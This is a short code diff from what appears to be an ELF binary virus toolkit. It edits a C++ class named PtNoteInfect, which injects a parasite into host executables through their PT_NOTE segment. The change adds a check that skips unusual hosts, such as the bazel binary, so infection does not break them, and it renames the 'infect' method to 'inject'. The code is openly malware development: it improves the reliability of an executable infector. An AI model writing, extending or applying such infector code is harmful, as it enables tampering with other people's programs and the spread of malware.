@@ -100,10 +100,19 @@ bool PtNoteInfect::analyze(const common::Mmap<PROT_READ>& host_mapping,
     // highest vaddress.
   }
 
+  // if in the rare case that host is some wierdo, that actually has data at the
+  // end of the file after section header table, do not infect because it's
+  // likely there are other issues preventing it from working. For example, the
+  // binary distributed by bazel does this https://github.com/bazelbuild/bazel
+  if (parasite_load_address_ <=
+      host_mapping.size() - ehdr.e_shnum * ehdr.e_shentsize) {
+    return false;
+  }
+
   return true;
 }
 
-bool PtNoteInfect::infect(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
+bool PtNoteInfect::inject(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                           vt::common::Mmap<PROT_READ> parasite_mapping) {
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
 
